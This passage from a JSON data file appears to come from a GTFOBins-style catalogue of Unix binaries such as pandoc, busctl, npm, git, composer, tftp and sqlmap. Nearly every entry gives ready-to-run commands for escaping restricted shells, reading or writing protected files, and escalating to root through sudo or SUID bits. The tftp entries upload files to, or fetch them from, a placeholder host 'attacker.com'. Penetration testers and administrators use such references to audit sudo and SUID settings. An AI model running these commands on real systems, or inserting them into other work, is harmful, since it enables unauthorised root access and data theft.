          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\necho DATA | pandoc -t plain -o \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\npandoc -L $TF /dev/null\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\n./pandoc -L $TF /dev/null\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\nsudo pandoc -L $TF /dev/null\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tbl": {
    "description": "The read file content is corrupted by additional text at the beginning.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ntbl $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./tbl $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo tbl $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "busctl": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "busctl --show-machine\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "timeout": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "timeout 7d /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./timeout 7d /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo timeout --foreground 7d /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "msgfilter": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmsgfilter -P -i \"LFILE\" /bin/cat\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "npm": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "npm exec /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tftp": {
    "description": "",
    "functions": {
      "file-upload": [
        {
          "code": "RHOST=attacker.com\ntftp $RHOST\nput file_to_send\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\ntftp $RHOST\nget file_to_get\n",
          "description": "It can download remote files."
        }
      ],
      "suid": [
        {
          "code": "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "install": {
    "description": "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a copy of the file.",
    "functions": {
      "suid": [
        {
          "code": "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cp": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        },
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        },
        {
          "code": "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo cp /bin/sh /bin/cp\nsudo cp\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "composer": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\n./composer --working-dir=$TF run-script x\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pdb": {
    "description": "This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "vipw": {
    "description": "This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.",
    "functions": {
      "suid": [
        {
          "code": "./vipw",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo vipw",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "yarn": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "yarn exec /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nyarn --cwd $TF install\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo yarn exec /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xxd": {
    "description": "",
    "functions": {
      "file-write": [
        {
          "code": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "lftp": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "lftp -c '!/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./lftp -c '!/bin/sh'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo lftp -c '!/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "git": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "PAGER='sh -c \"exec sh 0<&1\"' git -p help",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "git help config\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "git branch --help config\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\ngit \"--exec-path=$TF\" x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\ngit diff /dev/null $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "git apply --unsafe-paths --directory / x.patch\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo git -p help config\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo git branch --help config\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "zsoelim": {
    "description": "The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nzsoelim \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "more": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TERM= more /etc/profile\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "more file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./more file_to_read",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "TERM= sudo more /etc/profile\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ssh-agent": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ssh-agent /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./ssh-agent /bin/ -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ssh-agent /bin/",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "mail": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "mail --exec='!/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo mail --exec='!/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "sqlmap": {
    "description": "This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "csplit": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "TF=$(mktemp)\necho \"DATA\" > $TF\nLFILE=file_to_write\ncsplit -z -b \"%d$LFILE\" $TF 1\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "paste": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\npaste $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\npaste $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo paste $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "arj": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "TF=$(mktemp -u)\nLFILE=file_to_read\narj a \"$TF\" \"$LFILE\"\narj p \"$TF\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\narj e \"$TF/a\" $LDIR\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "redcarpet": {
    "description": "The file is actually parsed as a Markdown file.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nredcarpet \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "look": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nlook '' \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./look '' \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "gem": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "gem open -e \"/bin/sh -c /bin/sh\" rdoc",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "gem open rdoc\n:!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
